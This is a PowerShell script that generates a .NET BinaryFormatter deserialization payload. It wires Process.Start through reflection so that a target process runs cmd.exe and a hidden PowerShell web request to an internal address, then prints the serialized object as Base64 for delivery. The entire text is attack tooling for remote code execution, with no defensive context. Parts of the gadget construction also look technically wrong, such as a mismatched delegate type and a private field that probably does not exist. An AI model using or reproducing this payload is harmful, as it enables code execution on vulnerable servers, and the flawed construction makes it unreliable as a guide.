# --- Configuration ---
# The target IP and port for the HTTP request
$targetUrl = "http://10.230.200.240:8080/"

# The command to execute on the target during deserialization
# We use PowerShell to make the HTTP request to avoid external dependencies
$command = "powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri '$targetUrl' -UseBasicParsing"""

# --- Payload Construction ---
# 1. Create a delegate that points to Process.Start
$processStartInfoType = [System.Diagnostics.ProcessStartInfo]
$processType = [System.Diagnostics.Process]
$startMethod = $processType.GetMethod('Start', [Type[]]@($processStartInfoType))
$startDelegate = [System.Delegate]::CreateDelegate([System.Func[System.Diagnostics.ProcessStartInfo, System.Diagnostics.Process]], $startMethod)

# 2. Prepare the arguments for Process.Start
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.Arguments = "/c $command"
$psi.UseShellExecute = $false
$psi.RedirectStandardOutput = $true

# 3. Create a ComparisonComparer with the delegate and arguments
$comparisonComparerType = [System.Collections.Generic.ComparisonComparer[int]]
$comparisonDelegateType = [System.Comparison[int]]
$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
$comparisonComparer = $constructor.Invoke(@($startDelegate))

# 4. Use reflection to set the internal fields of the ComparisonComparer
$delegateField = $comparisonComparerType.GetField('_comparison', [System.Reflection.BindingFlags]'NonPublic, Instance')
$targetField = $comparisonComparerType.GetField('_target', [System.Reflection.BindingFlags]'NonPublic, Instance')
$delegateField.SetValue($comparisonComparer, $startDelegate)
$targetField.SetValue($comparisonComparer, $psi)

# --- Serialization ---
$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
$ms = New-Object System.IO.MemoryStream
$formatter.Serialize($ms, $comparisonComparer)
$payload = $ms.ToArray()

# Output the payload as a Base64 string for easy transport
$base64Payload = [Convert]::ToBase64String($payload)
Write-Host "Base64 Payload: $base64Payload"
